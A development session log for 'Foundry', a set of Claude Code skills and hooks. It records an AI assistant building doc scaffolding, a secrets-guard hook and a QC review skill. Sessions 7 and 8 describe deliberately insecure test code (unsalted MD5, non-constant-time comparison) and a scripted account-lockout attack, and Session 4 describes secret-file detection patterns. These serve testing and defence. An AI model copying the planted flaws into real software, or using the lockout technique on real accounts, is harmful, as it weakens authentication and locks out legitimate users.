3. **End-of-init reminder** — added to Step 4, fires every time for every project type. Explains load-vs-write distinction plainly: hooks load docs automatically, but writing still requires the assistant. "Wrap up and update the docs" identified as the key habit phrase. USER_GUIDE.md limitations section rewritten to lead with this instead of burying it.
4. **Status hook message rewrite** — "not set up" message changed from a flat system notice to an inviting prompt: "New project detected - Foundry is not set up here yet..." with a time estimate and clear dismiss instruction. Validated against all three states (scaffolded / dismissed / neither) before committing.

### What was decided
- Periodic "should I update docs?" prompts every 2-3 exchanges were considered and rejected — event-based is better than time-based; fixed-interval prompts become noise that trains users to ignore them.
- The load-vs-write distinction is the most practically important limitation to communicate — it's what causes the most confusion after setup. Now leads the USER_GUIDE.md limitations section and gets an in-the-moment reminder at end of every init.

### Verification
- Status hook validated against all three states after message rewrite — all correct.
- Foundry was actually used on Karbot Rage (a real mature project) this session — exercised the existing-project path end-to-end for the first time with a real user in real time, which is how all four gaps were found.

### What to do first next session
- Use Foundry on more real projects — that's the remaining test.

## 2026-06-29 (Session 11 — existing-project path; gap audit)

Real user scenario surfaced a gap: running `/foundry-init` on Karbot Rage (a mature project with hand-written docs) showed a two-option prompt ("throwaway or real project?") with no path for "this already has docs."

### What was built
- `foundry-init` Step 0 now has three explicit options: throwaway, new real project, existing project. Option 3 routes to a new `Step 0-E` that presents a menu of specific pieces (hooks, secrets guard, docs, governance, stack, hygiene, or all) and runs only what's selected — skipping the full questionnaire unless creating docs fresh.
- Removed the old disconnected "Notes on retrofitting" section at the bottom of `foundry-init/SKILL.md` — that logic is now integrated into the primary flow where it belongs.
- `foundry-hooks` Hook 3 fixed for standalone use: now always asks whether to mark `foundry.scaffolded: true` when wired on a project that already has docs, rather than leaving it perpetually offering `/foundry-init`.
- `USER_GUIDE.md` section 2 and decision guide updated to reflect the three-way choice.
- Frontmatter description updated to name all three paths explicitly.

### What was decided
- Full gap audit of all 7 sub-skills run this session — `foundry-docs`, `foundry-security`, `foundry-governance`, `foundry-stack`, `foundry-repo-hygiene` all clean; only `foundry-init` and `foundry-hooks` needed changes.
- The "existing project" path was a real gap, not just a UX polish item — without it, any user who ran `/foundry-init` on a mature project was one mis-click away from running the full questionnaire and potentially triggering foundry-docs' overwrite-protection flow on their hand-written CLAUDE.md.

### Verification
- Audited all 7 sub-skills by reading each SKILL.md in full, looking specifically for the same class of gap (missing third option, disconnected footnotes, standalone-vs-orchestrated behavior differences). Only the two above needed changes.

### What to do first next session
- Use Foundry on real projects — no more constructed test scenarios needed.

## 2026-06-28 (Session 10 — Promptify model/effort suggestion; public-launch prep)

The user asked whether Foundry should help pick which model/effort level to use per task (e.g. Haiku for simple lookups, Opus for complex work) — framed as automatic routing to save cost and avoid under/over-powering a request.

### What was decided
- Pushed back on the literal ask before building anything: Claude Code has no mechanism for a skill to dynamically swap the active model mid-conversation per-request — there's no API to "route" a specific prompt to a specific model the way the user initially imagined. Building something that implied otherwise would have been overstating what's actually possible.
- Reframed as a **recommendation**, not automatic routing — consistent with Foundry's existing philosophy everywhere else (suggest, ask, surface a decision; never act unilaterally). Scoped to live inside Promptify's existing Step 3/4 (it already classifies request shape/complexity to build the rewrite; reusing that judgment for a one-line model/effort suggestion costs almost nothing extra).
- Explicitly considered and rejected a separate, more "detailed" standalone command for this: it would need real data to reason over (actual cost/performance tradeoffs, historical outcomes) that isn't available to a skill today, so a deeper version would just be a longer restatement of the same judgment, not a genuinely better one. Documented as a deferred Roadmap item instead of building it speculatively — explicit reasoning for *why* it's deferred (lack of real data to reason over), not just "later."

### What was built
- Added a model/effort-suggestion structural element to `promptify`'s Step 3, alongside its existing role-framing/risk-flagging/hypothesis-enumeration elements — same anti-padding discipline (only fires when the task is clearly toward one end of the complexity spectrum, stays silent for routine/moderate cases).
- Added a Roadmap entry in README.md documenting the deferred "deeper standalone command" idea, with the actual reasoning for why it's not built yet.

### Verification
- Tested both directions for real, not just by re-reading the new instruction: a trivial arithmetic lookup ("what's 15% of 240") correctly triggered a Haiku suggestion with a one-line reason; a multi-service, multi-cause payment-bug debugging scenario correctly triggered an Opus/higher-effort suggestion, layered correctly alongside the already-existing hypothesis-enumeration and domain-risk-flagging elements rather than replacing them.
- Confirmed (by checking against prior sessions' test transcripts) that moderate-complexity requests (architecture decisions, research questions, writing tasks) correctly got no model suggestion at all — the element only fires at the extremes, as designed.

### Other work this session
- Wrote a job-hunting handoff brief (self-contained narrative + concrete interview talking points, grounded in actual repo facts) for the user to paste into a separate job-search-focused AI instance.
- Added Foundry to the user's GitHub profile README (`WarpedMind/WarpedMind`) — two precise additions (a "What I've Been Building" bullet and a table row), nothing else touched, given the profile is hiring/client-facing.
- Drafted two LinkedIn announcement post versions (full + punchy) for the user to edit into their own voice — corrected a real overstatement in the first internal draft before it reached the user: Foundry does not track context-window usage or tell you when to start a new session based on a percentage; it has a written drift-based checkpoint *suggestion* in generated CLAUDE.md files, not a measurement mechanism. Verified this distinction was already correctly stated in the published docs (`docs/HOWS_AND_WHYS.md` even has a section explicitly pre-empting this exact misconception) before concluding no repo fix was needed — the error was only in conversational draft text, never published.

### What to do first next session
- Foundry's KNOWN DEBT is otherwise unchanged from Session 9 — this session was a scoped feature addition plus public-launch support work, not a bug-closing pass.

## 2026-06-28 (Session 9 — USER_GUIDE.md, README personalization, license decision)

The user pointed out a real gap before public announcement: someone cloning the repo today would know Foundry exists and sounds good, but wouldn't know what actually happens on first run. Also raised licensing (does MIT let someone fork this with zero credit?) and asked for personal calls-to-action (LinkedIn, GitHub follow, CAIO Consultants) without making the project feel salesy.

### What was decided
- **License stays MIT, with one addition.** Direct answer given rather than hedged: MIT genuinely does not legally require attribution beyond keeping the license file in copies of the source — someone can rebrand/fork with no public credit and that's permitted. A more restrictive attribution-clause license was considered and explicitly rejected: it would trade away exactly the adoption-friendliness that makes a portfolio piece visible in the first place, for legal teeth that are rarely enforced in practice anyway. Added one non-binding line to the README ("if you use or fork this, a credit/link back is appreciated, not required") — the only part of the more-restrictive option that actually does anything, with none of the friction cost.
- **CTAs split by document, not sprinkled everywhere.** README gets a short personal "About" section near the top (humanizes the project immediately) and a casual "Get in touch" block at the bottom (GitHub follow/star, LinkedIn, CAIO Consultants contact + a plain non-markety blurb fetched/confirmed directly from the user, not invented). USER_GUIDE.md stays entirely CTA-free except one quiet closing line pointing back to the README — nobody wants sales framing while trying to learn what a command does.
- Real personal links/contact (LinkedIn, GitHub handle, CAIO Consultants email and a one-line description in the user's own words) were used directly rather than guessed — a WebFetch attempt against caioconsultants.com returned 403 (bot-blocked), so the actual blurb came from asking the user directly rather than fabricating positioning from the domain name alone.

### What was built
- **`USER_GUIDE.md`** (new) — the actual how-to doc, distinct from the README (pitch) and `docs/HOWS_AND_WHYS.md` (design reasoning). Walks through the literal first-run experience step by step (location check → throwaway/real fast-path → explain-mode choice → questionnaire → build sequence → final review → Promptify/qc-review mention), explains every standalone skill and when to invoke it alone, gives concrete decision guidance for every either/or choice in the system (brief vs. detailed, dismiss vs. init, `/promptify` vs. `/promptify!`, opt into qc-review's mechanical hook or not, STACK.md or not), and — explicitly requested — a "what Foundry does NOT do" section stating real limitations plainly (not a security audit, qc-review isn't a substitute for real review, governance placeholders aren't legal advice, the doc-loader hook doesn't enforce anyone reading the docs, nothing commits automatically).
- README updated: new About section near the top, Get in touch section at the bottom, install command's placeholder URL replaced with the real repo URL (was never fixed after going public), and pointers from the Promptify/qc-review sections to the relevant User Guide anchors for deeper decision-level detail.

### Verification
- Anchor links from README to USER_GUIDE.md sections were not just assumed correct — simulated GitHub's actual anchor-generation algorithm (lowercase, strip non-word chars, collapse whitespace to hyphens) against the real header text and caught a real bug: the em-dash in two headers collapses to a single hyphen, not a double hyphen, so the first draft of both links would have 404'd. Fixed before commit, not left as a "should work" guess.

### What to do first next session
- Consider whether USER_GUIDE.md needs a "table of contents" at the top now that it's grown to 9 sections — not done yet, worth revisiting once it's been read by a real first-time user and any navigation friction becomes concrete rather than speculative.
- The repo is otherwise in the same solid state as the end of Session 8 — this session was purely documentation/public-readiness, no skill behavior changed.

## 2026-06-28 (Session 8 — closing qc-review's two remaining test gaps)

Continuation of Session 7's momentum: KNOWN DEBT listed two untested qc-review paths — a true-negative case (confirming it reports "found nothing" plainly rather than padding) and the general/unclear fallback focus category. Closed both.

### What was found (unplanned, more valuable than the planned test)
- The first attempt at a "clean" auth.py for the true-negative test was hand-written to look correct but turned out to have a real bug: it declared `_failed_attempts = {}` (clearly intended as rate-limiting state) but never actually read or wrote it anywhere — decorative, non-functional lockout protection. `qc-review`'s fresh-context subagent caught this immediately (HIGH severity), independently verified by grepping the file and confirming the variable appears exactly once, on its own declaration line.
- This is a stronger result than a clean pass would have been: it demonstrates the skill isn't fooled by code that merely *looks* like it has a safety mechanism — it checks whether the mechanism is actually wired up, not just present.
- Fixed the file properly (real lockout with threshold/window logic, length bounds, malformed-input handling) and re-ran. Still not clean — found a real, independently-reproduced CRITICAL: the per-username lockout has no IP binding, so an attacker who knows a valid username can lock that legitimate user out of their own account with 5 wrong guesses (verified directly: scripted exactly this attack, confirmed the legitimate user's correct-password login then fails). Also found a real TOCTOU race condition on the unlocked read-modify-write of the lockout counter, confirmed by inspection (no lock/mutex anywhere around it).
- Concluded that getting a genuine "no findings" result from a file that has *any* real logic in it (even hardened logic) is harder than expected — the skill keeps finding legitimate second-order issues as the obvious ones get fixed, which is exactly the adversarial behavior it's meant to have, but meant the literal true-negative test needed a different kind of file.

### What was built/tested
- True-negative case, finally confirmed: ran the review against a genuinely trivial, stateless date-formatting utility (no auth/payments/secrets/destructive-action surface at all) with a general/unclear-category focus prompt. The subagent correctly returned a single plain sentence — "No findings — this file... has no overwrite, irreversible-action, confirmation, or secrets/logging surface to assess" — no padding, no manufactured concerns, exactly the report shape Step 3 specifies.
- This same test closed the second gap simultaneously: the general/unclear fallback focus (broad pass — overwrites, irreversible actions, secrets in output) was exercised for the first time and applied correctly to a file outside the named categories.

### Verification
- All three review rounds were real `Agent` tool invocations with zero prior context, not simulated — consistent with the skill's own Step 3 requirement.
- Every CRITICAL/HIGH claim across all three rounds was independently checked per Step 4 before being treated as real: grep-confirmed the dead rate-limiting variable, scripted and ran the actual account-lockout-DoS attack end-to-end, and confirmed the TOCTOU gap by reading the literal absence of locking in the source.

### What to do first next session
- `qc-review`'s KNOWN DEBT items are now both closed — no other known gaps in this skill specifically.
- Worth considering, not yet decided: should `qc-review`'s own documentation mention that "no findings" is a genuinely rare result for any file with real logic, so a user isn't surprised when it keeps finding things across iterations? Or is that already implied clearly enough by the skill's adversarial framing?

## 2026-06-28 (Session 7 — built qc-review, the previously-deferred QC/adversarial-review skill)

The Roadmap had a standalone fresh-context QC/adversarial-review skill flagged as deferred, with three explicit open design questions (what triggers it, how findings persist, how it avoids duplicating `/code-review`). The user asked to revisit it, confirmed it should stay inside Foundry's repo (referenced-not-owned, same pattern as Promptify) rather than become a separate project, then asked specifically that it be documented/educated-about and possibly auto-offered when appropriate.

### What was decided
- Resolved all three open design questions explicitly rather than building around them implicitly:
  - **Trigger**: on-demand (`/qc-review`) plus a proactive offer at natural checkpoints, both by default. A mechanical `PostToolUse` auto-run mode was considered and deliberately scoped as opt-in-only, not default — pushed back on the user's initial "all of the above" with a concrete reason: `PostToolUse` fires after every edit, not at a real completion checkpoint, so it would re-review the same half-finished function repeatedly during normal iteration, and can't block since the edit already happened by the time it fires.
  - **Findings persistence**: appended to CLAUDE.md's existing `KNOWN DEBT` section (reusing what's already there and already auto-loaded, rather than a new file), with every entry labeled `[QC review, <date>]` so a future reader can tell at a glance this came from an adversarial pass rather than ordinary work — same evidentiary-source discipline as this repo's own Session 4 findings.
  - **Avoiding `/code-review` duplication**: scoped explicitly narrower — destructive actions, security gaps, silent overwrites specifically, not general code quality — and the skill states this distinction plainly so it doesn't compete with a project's own `/code-review` if one exists.
- Scope default: everything changed since session start, not since the last git commit (matches the user's actual mental model of "what we just did" better than a commit-boundary cutoff).
- Review focus is inferred from what's in scope (same domain-judgment pattern as `promptify`'s risk-flagging) with an explicit, stated chance to redirect — not silently locked in, not a blocking question every time either.
- Confirmed the fresh-context-subagent mechanism (the actual thing that found this repo's own Session 4 bugs) is preserved as the literal implementation, not just inspirational framing — Step 3 explicitly forbids running the review inline in the current conversation.

### What was built
- `skills/qc-review/SKILL.md` — entry points (`/qc-review` default-scope, `/qc-review <description>` explicit scope), Step 1 (scope), Step 2 (focus inference + redirect), Step 3 (fresh subagent spawn via the `Agent` tool, self-contained prompt requirement since the subagent has zero conversation history), Step 4 (verify findings before trusting — reproduce CRITICAL/HIGH claims directly, don't relay on faith), Step 5 (persist to KNOWN DEBT, labeled by source), the proactive-offer criteria, and the opt-in-only mechanical-hook design (documented but not built, consistent with "offered, not forced" for Hook 4's precedent).
- Wired into `foundry-init`'s Step 3 (previously a forward-reference placeholder for this exact skill) and README's qc-review section, alongside Promptify.
- Re-ran `install.sh` — confirmed it auto-discovers the new skill directory with no changes needed, symlinked successfully.

### Verification
- Ran a real end-to-end test, not just a design review: a scratch project with a genuinely broken `auth.py` (unsalted MD5 password hashing, `==` instead of constant-time comparison, no rate limiting, username-enumeration timing leak).
- The fresh-context subagent (spawned via the real `Agent` tool, zero prior context, self-contained prompt naming the exact file and focus) found all 4 real issues, each with file/function, scenario, and severity — no padding, no generic summary, exactly the report shape specified.
- Applied Step 4 for real rather than skipping it: reproduced the CRITICAL finding directly (confirmed identical passwords produce identical MD5 hashes, and confirmed `hashlib.md5("password")` matches the public rainbow-table value exactly) and the HIGH finding directly (confirmed the source genuinely uses `==` with no `hmac.compare_digest` anywhere in the file) rather than trusting the subagent's claims on faith.
- Wrote a real KNOWN DEBT block with the `[QC review, <date>]` labeling format to confirm it reads clearly to a future session, then cleaned up the scratch project.

### What to do first next session
- This skill has now been verified on one project with one obvious, deliberately-planted bug class (weak crypto/auth). Still untested: a case where the review correctly finds *nothing* (to confirm it reports that plainly rather than padding), and a case outside the auth/payments/destructive-action focus categories (the "general/unclear" fallback focus).
- Consider whether `qc-review`'s proactive-offer criteria should also be cross-referenced from `foundry-security`/`foundry-governance`'s own SKILL.md files (e.g. "after wiring a secrets-guard hook, consider a qc-review pass on it") rather than only living in `foundry-init`'s Step 3.

## 2026-06-28 (Session 6 — closing remaining KNOWN DEBT, "bulletproof" pass)

The user wants Foundry to be a portfolio-quality, genuinely bulletproof piece (and intends to actually use it). Went through the full live KNOWN DEBT/Roadmap list from CLAUDE.md systematically, closing everything achievable rather than leaving a partial pass.

### What was built
- **Shell-quoting hardening, fixed and verified (was on Roadmap as a known latent issue).** Confirmed the bug for real first: `for f in $DOC_FILES` (bare word-splitting) genuinely breaks on a filename containing spaces — tested directly in `bash` (not zsh, which has different default word-splitting and gave a misleading first result) and got 5 garbage tokens instead of 1 filename. Fixed by substituting a properly double-quoted, JSON-escaped list into a real bash array (`DOC_FILES_ARR=(...)`) and iterating with `"${DOC_FILES_ARR[@]}"`. Verified the fix against 3 cases: a filename with spaces (now works), the normal real-world case (still works, no regression), and a missing file (graceful degradation still intact). Applied to the actual template and to Foundry's own live `.claude/settings.json`, re-validated both hooks still fire correctly afterward.
- **`foundry-stack` confidentiality cross-check, added (was on Roadmap).** Before asking the generic STACK.md fit question, the skill now checks whether CLAUDE.md's REGULATORY CONTEXT/COMPLIANCE section already contains confidentiality language, and surfaces that connection explicitly rather than letting the user answer "sure, track it" without seeing it. Verified the underlying detection logic against two realistic governance-section texts (a generic "not yet researched" placeholder correctly produces no match; a real "proprietary, no public disclosure" sentence correctly matches).
- **`/promptify` exercised against all 5 rewrite-mode shapes for the first time** (previously only debugging had been tested): architecture/design ("postgres or mongodb"), research ("why is react slow"), writing/communication ("write something about the new deploy process"), and confirmed role-framing both fires correctly when warranted (architecture, writing) and stays silent correctly when it shouldn't (research, debugging, implementation-shaped tasks).
- **`/promptify`'s build-from-scratch mode tested under real pressure** with a deliberately multi-angle goal ("build a REST API with auth, rate limiting, and tests") — confirmed the question-batching correctly used only 3 of 4 available slots (skipping role-framing and "anything else to bundle" as genuinely not relevant), and confirmed domain-risk-flagging and test-infrastructure-awareness both fired correctly in the resulting prompt while hypothesis-enumeration (debugging-only) correctly stayed out.
- **Status hook's dismiss path exercised through a real invocation** (previously only unit-tested in isolation): a real scratch project, the user actually typing "skip foundry for this project," the resulting `foundry.dismissed: true` write, confirmed the status hook goes silent, then confirmed the re-enable claim for real — writing `scaffolded: true` later while `dismissed: true` still exists in the JSON correctly flips the status hook back to "Active," exactly as the skill's own documentation claimed (now actually proven, not just asserted).
- **A full, realistic `/foundry-init` run on a genuinely different project** (a "Telomere" biohacking/wearables app concept, not another Foundry-built tool) — this was the single largest remaining gap. Real `.env` with fake-but-realistic credentials, real Python source reading `os.environ`, zero prior git commits. Exercised, for the first time end-to-end: `HANDLES_SECRETS=true` derived correctly from inspecting the actual code rather than asking; `foundry-repo-hygiene`'s gitignore-before-first-`git add` sequencing (built `.gitignore` and confirmed via `git check-ignore` that `.env` was protected *before* anything was staged); the full `foundry-security` flow including a real `git add -f .env` force-stage to confirm the secrets-guard `PreToolUse` hook genuinely blocks it (exit 1) and genuinely allows a clean commit (exit 0); `foundry-governance` handling a real *uncertain* regulatory case (health-data-adjacent, "possibly HIPAA-ish") by correctly writing an honest "not yet researched" placeholder rather than guessing a framework; and `foundry-stack`'s "leave the Current Stack table empty until verified" discipline holding on a true day-one project (a written `requirements.txt` did NOT get listed as "in use" just because it exists — it's in Planned/not-yet-built instead, since nothing has actually been run yet). The real first commit succeeded with `.env` never once touching git history, confirmed via `git log --all --diff-filter=A` showing only `.env.example`.

### What was decided
- Treated "designed and unit-tested" as categorically different from "exercised end-to-end on a real, different project" — several KNOWN DEBT items had passed isolated mechanism tests earlier this session but had never been run together, in sequence, against a real project with a different risk profile (secrets, an uncertain regulatory case, a true day-one stack). The full run surfaced no new bugs, but that itself is only meaningful because the individual pieces had already been hardened — confirms the earlier piecemeal verification work was sound, doesn't replace the value of the integration test.
- Did not invent a specific regulatory framework for the test project's "possibly regulated" case, even though the test would have been more dramatic with a definitive answer — the honest, correctly uncertain answer is what `foundry-governance`'s anti-fabrication rule is supposed to produce, and producing anything more confident-sounding would have been the wrong test result to celebrate.

### Verification
- Every fix in this session was tested against the real, exact command/logic as it appears in the actual file (template or skill), not a simplified standalone version — consistent with the lesson from Session 4's "tested" overclaim.
- The full `/foundry-init` run was a genuine, never-hand-simulated execution: real `AskUserQuestion` calls, real file writes, real git operations (`git check-ignore`, `git add -f`, `git commit`), real hook pipe-tests against the actual staged files at each step.

### What to do first next session
- KNOWN DEBT and Roadmap are both now substantially shorter — re-read both fresh next session to confirm nothing was missed in this pass, and update them to reflect everything closed here.
- Consider whether this "Telomere" test run is worth keeping as a permanent fixture/example (e.g. a documented walkthrough in HOWS_AND_WHYS.md) given how much it exercised, or whether it was correctly a disposable scratch test.

---

## 2026-06-28 (Session 5 — first real end-to-end /foundry-init run)

### What was built
- **Ran `/foundry-init` for real, via the Skill tool, on Foundry's own repo** — the milestone every prior session's "what to do first next session" had pointed at since Session 1. Not a scratch directory; a real project with 4 sessions of substantial existing CLAUDE.md/DECISIONS.md/SESSIONS.md content and an existing `.claude/settings.json`.
- **Verified the existing-file-detection safety path for real, not hypothetically.** Step -1's location check (`for d in */; do [ -d "${d}.git" ] && echo "$d"; done | wc -l`) correctly returned 0 for this real project root. `foundry-docs` Step 0 correctly detected all three existing docs, read them in full, and asked per-file what to do rather than touching anything by default — this is the exact path the Session 4 safety fixes were written for, now exercised on a real file with real content rather than a synthetic test.
- **`STACK.md` created for real** (Foundry didn't have one yet) — populated from Foundry's own actual, already-documented history (Sessions 1-4) rather than left as an empty template, since real verified history already existed to draw from. Demonstrates the why-linkage rule in practice, not just in a worked example.
- Confirmed Hook 1 (doc-loader) and Hook 3 (status hook) already existed correctly from earlier manual dogfooding — recognized this rather than blindly re-running `foundry-hooks` and duplicating them.
- Added the missing `foundry.scaffoldMode: "full"` marker (the field didn't exist when `foundry.scaffolded` was set manually earlier this session) — closes the gap noted in Session 4's KNOWN DEBT about this mechanism being designed but unexercised.
- User explicitly chose to append a small acknowledgment to SESSIONS.md/CLAUDE.md for this run (this entry) after questioning why I'd defaulted to recommending "leave everything alone" — correctly pointed out that a real, on-purpose milestone is exactly the kind of thing SESSIONS.md exists to record, and "minimize change" isn't a strong reason to skip that when the addition is small and additive.
- **`/promptify` exercised for real for the first time, via the Skill tool, against a deliberately rough debugging prompt ("fix the bug in the login thing, it's broken").** First pass correctly classified the request shape (debugging investigation) and produced a reasonable structural rewrite, but a user follow-up question ("what's missing to make this a better prompt?") surfaced two real gaps in the skill's own Step 3 instructions: no role/persona framing as an available structural element, and no domain-aware risk-flagging mechanism (e.g. nothing would have prompted flagging session-secret/password-hashing code as sensitive for a login bug specifically). Two more gaps found in the same pass: no hypothesis-enumeration step for debugging tasks (risk of fixating on the first plausible cause) and no mention of existing test infrastructure in the verification expectation.
- **Fixed all 4 gaps directly in `promptify`'s Step 3**, then re-ran the identical test prompt to confirm the fix actually worked rather than just looking plausible on paper. Second pass output included hypothesis enumeration, a concrete named security guardrail (session-secret/token-signing/password-hashing), and explicit test-suite/regression-test guidance — and correctly did NOT add role/persona framing, confirming the new "only when it changes response quality, not mechanically every time" instruction is actually followed rather than just bloating every output.
- **Added a third `promptify` entry point: bare `/promptify` with no arguments — a guided build-from-scratch mode**, prompted by the user's own idea after seeing the rewrite mode work well: when there's no rough idea typed yet, ask one open-ended goal question as plain text (can't be `AskUserQuestion` — that requires 2-4 concrete options and can't represent true free text), then batch the remaining structural questions (role, scope, output format, platform/constraints) into a single `AskUserQuestion` call rather than asking them one at a time. Tested for real with the goal "I guess I want to create a game" — produced a genuine, well-scoped design-planning prompt (game-designer role correctly applied since design judgment mattered here; explicit planning-only scope honoring the user's "design first, code later" answer; the user's free-text platform detail, given via "Other," correctly carried through into the final prompt).
- **Corrected an overstated cost claim in the new mode's own description** after the user asked directly whether the back-and-forth in that test was free or just "substeps." Confirmed honestly: every skill invocation, question, and answer is a normal turn with real context cost — no special low-cost mechanism exists. The new mode is *relatively* cheaper than the fully-conversational alternative (fewer total turns: ~6 exchanges here vs. an estimated ~9-10 if the same 4 structural questions had been asked one at a time), not free or context-neutral in absolute terms. Rewrote the skill's own "why this exists" framing to state this precisely rather than implying a stronger savings claim than is true.

### What was decided
- When the user pushed back on my "leave alone" recommendation, re-examined the actual reasoning rather than defending the original call: the recommendation had been driven by general caution, not a specific reason that applied here. Updated to match what the situation actually warranted.
- Treated "I have real knowledge of what makes a good prompt" (role-framing, specificity, no contradictions, explicit success criteria) as necessary but not sufficient — the actual test was whether that knowledge was being correctly operationalized into the skill's own written instructions, which it wasn't, for at least 4 concrete structural elements. Fixed the instructions, not just the one output, so future invocations get the improvement too.
- When asked directly whether a cost claim was accurate, didn't just confirm it was "basically true" — checked the actual mechanism (skill invocation loads the full file into context; every question/answer is a normal turn) and corrected the skill's own wording to avoid overstating the savings, consistent with this whole project's standing rule about not trusting/making confident-sounding claims without verifying them first.

### Verification
- Step -1's location-check command run for real in this repo: returned 0, confirmed correct.
- `foundry-docs` Step 0 exercised for real: read all three existing files in full before doing anything, surfaced their content honestly rather than assuming, and got an explicit per-file decision before any write.
- Settings.json re-validated with `jq -e` after the `scaffoldMode` edit; both existing hooks re-tested and confirmed still firing correctly afterward.
- `promptify`'s Step 3 fix verified by direct before/after comparison on the identical input — not just inspecting the new instructions in isolation, but re-running the actual skill and confirming the output changed in the intended ways (and didn't change in ways it shouldn't have, e.g. no role-framing added where it wasn't warranted).
- The new build-from-scratch mode verified by a real, live invocation with no arguments (not hand-simulated) — confirmed the plain-text-then-batched-AskUserQuestion flow actually works as designed, including a free-text "Other" answer (mobile-portability platform detail) correctly carrying through to the final output.

### Cross-project drift detection (added later same session)
- The user noticed this very conversation had drifted from an earlier, unrelated project into Foundry's own work for hours with nothing ever flagging the handoff — and asked whether Foundry should detect this. Real gap: confirmed.
- Investigated a `CwdChanged` hook (confirmed as a real, valid Claude Code hook event) to detect this mechanically. Could not verify its actual stdin payload shape from within the session — unlike `Bash`/`Write` hooks, it can't be pipe-tested with synthetic input; it requires a genuine directory-change event from the harness. Declined to write hook logic against a guessed payload shape (would repeat the Session 4 "tested" overclaim mistake).
- Shipped the verifiable half instead: extended the CLAUDE.md template's context-checkpoint rule with an explicit directory-change trigger (alongside the existing session-length trigger), and back-ported the entire context-checkpoint rule into Foundry's own CLAUDE.md, which had never actually received it despite being added to the template in Session 2. Documented the real `CwdChanged` hook idea on README's Roadmap as designed-but-unverified, with the specific blocker named.

### Cross-project drift detection, continued — CwdChanged superseded by a working alternative
- The user asked to actually try triggering `CwdChanged` for real, since "designed but deferred" wasn't good enough to leave as the final answer. Tried two real triggers: a plain external-shell `cd` (didn't fire — wrong context, not inside an active Claude Code session at all) and a Bash-tool `cd` within this active session (didn't fire, and the shell's own cwd silently reset afterward, revealing the Bash tool pins to a fixed directory regardless of `cd` commands run inside it).
- Tried `EnterWorktree` as a more promising trigger (its docs explicitly say it changes the session's working directory) — it errored with "not in a git repository," which was the key finding: **this entire session's extensive Foundry work happened via path-qualified commands (`cd ~/Projects/foundry && ...`), never an actual persistent directory change** — the harness's own tracked session root had silently stayed at the conversation's original directory (not even a git repo) the whole time, despite hours of real work elsewhere. This means `CwdChanged`, even if fully built and working, would not have fired during this exact session — the very scenario that motivated wanting it.
- Reframed the actual gap from "detect a cwd change" (didn't happen, by the harness's own tracking) to "detect command-level directory drift" (did happen, repeatedly, via path-qualified Bash commands) — a different, buildable mechanism. Built a `PreToolUse`/`Bash` hook (new Hook 4 in `foundry-hooks`) that inspects each Bash command for a leading `cd` to a directory outside the project, and logs it to `.claude/drift.log`. Iterated through a real bug (a trailing-space parsing error caught only by `bash -x` tracing, not by reading the script) before landing on a version verified against 6 real test cases in both directions. Two real, accepted limitations stated plainly in the skill: only catches `cd` as the first token (confirmed by test — `echo hello; cd ~/other` is missed), and relative `cd ..` can't be resolved against ground truth the hook doesn't have access to.
- Updated README's Roadmap entry from "designed but unverified" to "investigated and superseded" — marked complete with a real working alternative, not left open.

### What to do first next session
- Exercise the status hook's dismiss path through a real invocation — still open from Session 2/4.
- Test `/promptify` against at least one non-debugging shape (e.g. an architecture decision or writing task) to confirm the new role-framing element actually fires correctly when it should, since this session's test only confirmed it correctly stayed silent when it shouldn't.
- Consider running `/foundry-init` next on a genuinely different, less-similar real project (not another Foundry-built tool) to test the questionnaire path on something with a different risk profile (e.g. actual secrets handling).
- Decide whether the user wants to actually act on the "create a game" demo prompt, or whether it was purely illustrative for this test.
- Verify `CwdChanged`'s real stdin payload shape (via `/hooks` or a genuine cross-project session) and build the actual hook once confirmed.

---

## 2026-06-28 (Session 4 — independent safety review, destructive-action audit)

### What was built
- **Two real overwrite gaps closed**, found by the user noticing what I'd missed: `foundry-docs` previously had no check for existing CLAUDE.md/DECISIONS.md/SESSIONS.md before writing — running it on a real project (e.g. one with months of hand-maintained docs) would have silently clobbered them with template scaffolding. Added Step 0: read existing files first, ask per-file whether to leave alone/append/fully re-render, default to "leave alone." Same gap found and fixed in `foundry-governance` (regulatory content) and `foundry-stack` (STACK.md).
- **Location safety added**: `foundry-init` previously had no check for whether the current directory was an actual project root vs. a container folder holding multiple projects (e.g. `~/Projects/`) — running it in the wrong place could have scaffolded a confusing mess at the wrong level. Added Step -1 with a concrete, tested command (`for d in */; do [ -d "${d}.git" ] && echo "$d"; done | wc -l` — verified to return 0 in a real project root and 4 in a real multi-project container) rather than relying on judgment alone.
- **README "Safety" section added**, explaining non-destructiveness, scope (single directory only), and full reversibility of turning Foundry off — written because the user asked directly "what happens if someone turns this off, will their docs break" and the honest answer (no, they're just plain Markdown) needed to be stated somewhere visible, not just true by accident.
- **Independent safety review commissioned**: spawned a fresh subagent with zero context on how/why Foundry was built, instructed to read every skill cold as a skeptical reviewer hunting specifically for silent/irreversible actions, unclear blast radius, ambiguous instructions, unchecked assumptions, and skills stepping on each other. This is the same "oversight instance" pattern discussed earlier in this work (a second set of eyes with no stake in the existing design). The review found 14 distinct issues, 2 of them CRITICAL and independently *verified* by live-testing the actual regex/glob patterns against adversarial filenames, not just inspecting the prose.
- **Both CRITICAL findings fixed and re-verified**:
  - The secrets-guard commit hook's regex (`foundry-hooks` Hook 2) missed `secrets.env`, `.env.production.local`, `config.yaml.bak`, `real.key.txt` — confirmed independently by reproducing the reviewer's exact test. Replaced with a broader pattern, then verified myself against an 18-file adversarial fixture (both directions: catches real secret-like names with suffixes/prefixes/nested paths; does not false-positive on `secretary_notes.txt`, `api_keynote.md`, `keyboard_shortcuts.md`, `monkey.py`, `the_keymaster.rb`, `.env.example`).
  - The `.gitignore` baseline (`foundry-security`) had the same root-cause gap, plus a distinct one (gitignore glob syntax can't word-boundary-match the way regex can, so a naive `*secret*` glob would have falsely ignored `secretary_notes.txt`). Iterated through 4 versions of the pattern set, testing each against `git check-ignore` directly, before landing on one that passes all 19 fixture cases in both directions.
  - The already-committed-secrets check (`foundry-security` step 3) only searched a fixed filename list — added a broader historical scan (`git log --all --diff-filter=A --name-only ... | grep -iE 'env|secret|key|pem|cred|password|token|config'`) as a second pass, tested against a real private repo to confirm it produces a sane, reviewable candidate list rather than noise.
